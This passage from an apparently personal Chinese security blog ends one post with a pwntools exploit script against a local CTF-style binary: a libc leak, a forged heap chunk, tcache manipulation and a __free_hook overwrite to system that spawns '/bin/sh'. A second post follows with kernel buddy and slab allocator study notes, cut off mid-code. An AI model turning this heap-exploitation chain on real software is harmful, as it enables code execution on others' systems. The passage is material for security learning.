<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>, <span class="number">00</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx, size, con=<span class="string">'aaaa'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># can be used only once</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vul</span><span class="params">(idx, con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Sure to exit?(y/n)"</span>, <span class="string">'n'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>], <span class="number">16</span>)-lb.sym[<span class="string">'puts'</span>]</span><br><span class="line">print(<span class="string">"libc"</span>, hex(libc))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">no pie </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">bss = <span class="number">0x404140</span></span><br><span class="line">size = <span class="number">0x100</span>+(<span class="number">0x1f0</span><span class="number">-0x80</span><span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x1f0</span>)</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0xf8</span>)</span><br><span class="line">alloc(<span class="number">2</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">    alloc(<span class="number">3</span>+i, <span class="number">0x1f0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">    dlt(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">3</span>, <span class="number">0x80</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(size | <span class="number">1</span>)+p64(bss+<span class="number">4</span>*<span class="number">8</span><span class="number">-0x18</span>)+p64(bss+<span class="number">4</span>*<span class="number">8</span><span class="number">-0x10</span>)</span><br><span class="line">alloc(<span class="number">4</span>, <span class="number">0x80</span>, payload)  <span class="comment"># fake chunk in it</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    alloc(i+<span class="number">5</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dlt(i+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0xf0</span>*<span class="string">b'a'</span>+p64(size)</span><br><span class="line">vul(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">dlt(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">7</span>,<span class="number">0xf0</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">5</span>, <span class="number">0x150</span>)</span><br><span class="line">payload=p64(libc+lb.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">alloc(<span class="number">6</span>, <span class="number">0x90</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">alloc(<span class="number">8</span>,<span class="number">0xf0</span>,p64(libc+lb.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/24/linux-kernel-heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2021/03/24/linux-kernel-heap/" class="post-title-link" itemprop="url">linux_kernel_heap</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2021-03-24 21:19:42" itemprop="dateCreated datePublished" datetime="2021-03-24T21:19:42+08:00">2021-03-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2021-04-03 23:18:42" itemprop="dateModified" datetime="2021-04-03T23:18:42+08:00">2021-04-03</time>
              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="linux-kernel-heap"><a href="#linux-kernel-heap" class="headerlink" title="linux kernel heap"></a>linux kernel heap</h1><h2 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h2><p>伙伴系统</p>
<p>采用二分法分配内存</p>
<p>分配的内存大小必须是2的整数次幂，2的指数（幂）就称为一个块的order。</p>
<p>块的大小单位为一个页的大小，比如一个页为4k的系统，order为0的堆块的大小就是(2^0)*4K。</p>
<p>分配连续的物理空间</p>
<p>memory zone </p>
<p>DMA and DMA32 zones, highmem zone and a Normal zone and other zones</p>
<p>vmalloc 的分配的空间在虚拟内存下时连续的，但是不一定要在物理内存下时连续的。</p>
<p>通过/proc/buddyinfo和/proc/pagetypeinfo查看分配的情况</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/buddyinfo</span></span><br><span class="line">Node 0, zone      DMA      0      0      0      1      2      1      1      0      1      1      3</span><br><span class="line">Node 0, zone    DMA32      0      5      3      6      7      8      8     10      7      3     14</span><br></pre></td></tr></table></figure>
<h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>首先有个大堆块</p>
<p>当分配时首先确定需要的块大小（确定需要那个oder的块）</p>
<p>如果当前的order有剩余的块则分配值，否则将order更大的块进行切分</p>
<p>Linux中通过get_free_pages实现</p>
<h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>当有块释放时，检查相邻的块（从同一个块中切分出来的），就将其合并成更大的order的块。</p>
<p>Linux中通过alloc_pages实现</p>
<h3 id="buddy-allocator"><a href="#buddy-allocator" class="headerlink" title="buddy allocator"></a>buddy allocator</h3><p>分配页的函数在”linux/gfp.h”中（gfp是get free page的意思），其中 gfp_mask是alloc_pages用来表示谁来请求这次的内存分配。比如GFP_KERNEL用来表示这个页框是在内核中使用的，GFP_USER表示在用户空间使用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alloc_pages(gfp_mask, order) \</span></span><br><span class="line">		alloc_pages_node(numa_node_id(), gfp_mask, order)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocate pages, preferring the node given as nid. When nid == NUMA_NO_NODE,</span></span><br><span class="line"><span class="comment"> * prefer the current CPU's closest node. Otherwise node must be valid and</span></span><br><span class="line"><span class="comment"> * online.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *<span class="title">alloc_pages_node</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line"><span class="function"><span class="params">						<span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment"> * Allocate pages, preferring the node given as nid. The node must be valid and</span></span></span><br><span class="line"><span class="function"><span class="comment"> * online. For more general interface, see alloc_pages_node().</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct page *</span></span><br><span class="line"><span class="function">__<span class="title">alloc_pages_node</span><span class="params">(<span class="keyword">int</span> nid, <span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment"> * This is the 'heart' of the zoned buddy allocator.</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function">struct page *</span></span><br><span class="line"><span class="function">__<span class="title">alloc_pages_nodemask</span><span class="params">(<span class="keyword">gfp_t</span> gfp_mask, <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">int</span> preferred_nid,</span></span></span><br><span class="line"><span class="function"><span class="params">							<span class="keyword">nodemask_t</span> *nodemask)</span></span></span><br></pre></td></tr></table></figure>
<p>释放页</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pages</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr != <span class="number">0</span>) &#123;</span><br><span class="line">		VM_BUG_ON(!virt_addr_valid((<span class="keyword">void</span> *)addr));</span><br><span class="line">		__free_pages(virt_to_page((<span class="keyword">void</span> *)addr), order);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//---&gt;....</span></span><br></pre></td></tr></table></figure>
<h2 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h2><p><img src="/2021/03/24/linux-kernel-heap/slab.png" alt="img"></p>
<p>slabs_full    完全分配的slab</p>
<p>slabs_partital    部分分配的slab</p>
<p>slabs_empty    空空的slab</p>
<p>SLAB: 从伙伴系统分配的 2^order 个物理页就组成了一个 SLAB ，而后续的操作就是在这个 SLAB 上在进行细分的，具体的结构体是 struct slab 。</p>
<p>每个kmem_cache里面包含的很多slab结构，同一个kmem_cache中包含的obj的大小都是相同的，每个slab只针对一种数据类型</p>
<p>每个slab结构中可以包含很多的obj</p>
<p>每个slab是有一个或者多个连续的页组成</p>
<p>kmalloc是基于slab分配器的</p>
<p>利用cat /porc/slabinfo来打印出相关的结构</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Boot took 0.99 seconds</span><br><span class="line">/ <span class="comment"># cat /proc/slabinfo</span></span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line">kcopyd_job             0      0   3312    9    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">scsi_sense_cache      32     32    128   32    1 : tunables    0    0    0 : slabdata      1      1      0</span><br><span class="line">i915_vma               0      0    576   14    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">execute_cb             0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">i915_request           0      0    640   12    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">sgpool-16              8      8    512    8    1 : tunables    0    0    0 : slabdata      1      1      0</span><br><span class="line">isofs_inode_cache      0      0    624   13    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">fat_inode_cache        0      0    712   11    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">fat_cache              0      0     40  102    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">jbd2_journal_handle      0      0     48   85    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">jbd2_journal_head      0      0    120   34    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">jbd2_revoke_table_s      0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">ext4_inode_cache       0      0   1064   15    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">ext4_allocation_context      0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br></pre></td></tr></table></figure>
<p>active_objs 正在被使用的obj的数量</p>
<p>num_objs obj的总量</p>
<p>objsize obj的大小</p>
<p> objperslab 每个slab中可以有多少个obj</p>
<p> pagesperslab 每个slab对应几个页·</p>
<h3 id="slab-allocator"><a href="#slab-allocator" class="headerlink" title="slab allocator"></a>slab allocator</h3><p>buddy系统会产生大量的内碎片，比如（伙伴系统只能分配连续的物理内存页）一个33page的请求就伙伴系统就会分配2^6=64pages，相当于浪费了31pages。引入slab allocator就是为了把页分成更小的块来进行分配。</p>
<p><strong>slab 核心思想是在保存那些常用堆块的缓存，以便能够在内核中进行分配。</strong>这是非常有意义的，通过缓存被释放obj，有一些常用的结构就能够在复制新的同样的结构时进行快速分配。通过重新利用被释放的obj，在某些情况下，内核就不必再重新申请内存了。Linux的slab allocator经过长期的发展，已经发生了很大的变化。现在slab allocator有三种不同的实现</p>
<ol>
<li>SLOB Allocator 是在solaris os被实现的最原始的slab allocator，现在大多被用在内存很小的嵌入式系统里，分配小内存非常高效，首次适应分配算法</li>
<li>SLAB Allocator SLAB的升级，旨在变得更加的“cache friendly”</li>
<li>SLUB Allocator 通过减少使用的队列/链来回获得比SLAB更好的执行时间</li>
</ol>
<p><strong>今天大多数系统中使用的SLUB</strong></p>
<p>一个slab cache包含许多slab，一个slab中包含很多obj</p>
<p>？分别对应什么结构</p>
<p>slab cahes —&gt;struct kmem_cache</p>
<p>页 —&gt; struct page</p>
<p>slab —&gt; page</p>
<p>obj的结构</p>
<p>有两种主要的cache</p>
<ol>
<li>Dedicate（专用的）：这些缓存是给那些常用的内核中的结构的。这写结构被分配时就是初始化过的，被释放的时候还是保持被初始化的，一边下一次分配的时候会变得更快</li>
<li>Generic（通用的）：这些都是通用的缓存，在大多数情况下，它们的大小对应于2的幂。</li>
</ol>
<p>dma-kmalloc-256  以上时专用缓存，dma-kmalloc-256及以下时通用缓存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vm_area_struct     65543  66082    208   19    1 : tunables    0    0    0 : slabdata   3478   3478      0</span><br><span class="line">mm_struct            213    225   2112   15    8 : tunables    0    0    0 : slabdata     15     15      0</span><br><span class="line">files_cache          228    230    704   23    4 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">signal_cache         399    448   1024   16    4 : tunables    0    0    0 : slabdata     28     28      0</span><br><span class="line">sighand_cache        414    435   2112   15    8 : tunables    0    0    0 : slabdata     29     29      0</span><br><span class="line">task_struct         1102   1125   5952    5    8 : tunables    0    0    0 : slabdata    225    225      0</span><br><span class="line">dma-kmalloc-256        0      0    256   16    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-128        0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-64         0      0     64   64    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-32         0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-16         0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-8          0      0      8  512    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-256         1801   2064    256   16    1 : tunables    0    0    0 : slabdata    129    129      0</span><br><span class="line">kmalloc-192         4410   4410    192   21    1 : tunables    0    0    0 : slabdata    210    210      0</span><br><span class="line">kmalloc-128         2689   2752    128   32    1 : tunables    0    0    0 : slabdata     86     86      0</span><br><span class="line">kmalloc-96          6952   7350     96   42    1 : tunables    0    0    0 : slabdata    175    175      0</span><br><span class="line">kmalloc-64         25933  26496     64   64    1 : tunables    0    0    0 : slabdata    414    414      0</span><br><span class="line">kmalloc-32         15150  15616     32  128    1 : tunables    0    0    0 : slabdata    122    122      0</span><br><span class="line">kmalloc-16         18432  18432     16  256    1 : tunables    0    0    0 : slabdata     72     72      0</span><br><span class="line">kmalloc-8          10149  10240      8  512    1 : tunables    0    0    0 : slabdata     20     20      0</span><br></pre></td></tr></table></figure>
<h4 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h4><p><strong>kmalloc是内核通过slab allocator进行一般内存分配的接口</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// "include/linux/slab.h"</span></span><br><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br><span class="line"><span class="comment">//allocates memory through slab allocator.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kzalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br><span class="line"><span class="comment">//allocates memory (and zeroes it out like calloc() in libc) through the slab allocator.</span></span><br><span class="line"><span class="comment">//和libc中的calloc相似</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * __<span class="function">must_check <span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">gfp_t</span>)</span></span>;</span><br><span class="line"><span class="comment">//resize existing allocation.</span></span><br><span class="line"><span class="comment">//和libc中realloc相似</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="comment">//frees memory previously allocated.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kzfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="专用缓存（Dedicated-Cache）的初始化"><a href="#专用缓存（Dedicated-Cache）的初始化" class="headerlink" title="专用缓存（Dedicated Cache）的初始化"></a>专用缓存（Dedicated Cache）的初始化</h4><p>以vm_area_struct的slab cache 为例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//"kernel/fork.c"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* slab cache for vm_area_struct structures */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">vm_area_cachep</span>;</span></span><br><span class="line"></span><br><span class="line">vm_area_cachep = KMEM_CACHE(vm_area_struct, SLAB_PANIC|SLAB_ACCOUNT);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> KMEM_CACHE() is a macro defined in "/include/linux/slab.h" which actually expands</span></span><br><span class="line"><span class="comment"> to a call to kmem_cache_create() which is the procedure to register a new slab</span></span><br><span class="line"><span class="comment"> cache and adds the new cache to the list of all slabs in the system.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> = <span class="title">kmem_cache_alloc</span>(<span class="title">vm_area_cachep</span>, <span class="title">GFP_KERNEL</span>);</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> kmem_cache_alloc() is the procedure to allocate the object from the dedicated</span></span><br><span class="line"><span class="comment"> cache memory. The allocation will be attempted first on a partially filled slab,</span></span><br><span class="line"><span class="comment"> then (if no partially filled slabs are available) in a free slab,</span></span><br><span class="line"><span class="comment"> and if no free slabs are found,</span></span><br><span class="line"><span class="comment"> it will try to allocate new page frames from the underlying buddy allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> kmem_cache_free(vm_area_cachep, vma);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  kmem_cache_free() is the procedure that frees the memory allocated to the vma object</span></span><br><span class="line"><span class="comment">  previously allocated. The (now free'd) slab,</span></span><br><span class="line"><span class="comment">  will be kept in order to be used for future allocations and the memory is NOT</span></span><br><span class="line"><span class="comment">  released immediately after this call. When all of the slabs have been free'd,</span></span><br><span class="line"><span class="comment">  kernel modules have to call kmem_cache_destroy() to release the pre allocated memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<h4 id="SLAB-Cache-管理"><a href="#SLAB-Cache-管理" class="headerlink" title="SLAB Cache 管理"></a>SLAB Cache 管理</h4><p>kmem_cache中的结构</p>
<p><code>unsigned int gfporder</code></p>
<p>每个slab能够存放的页的数量。</p>
<p><code>struct kmem_cache_node *node[MAN_NUMNODES]</code> </p>
<p>用来存储不同状态的slab，主要维护三个变量，这个主要是维护这个kmem_cache_node中的slab的信息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The slab lists for all objects.</span></span><br><span class="line"><span 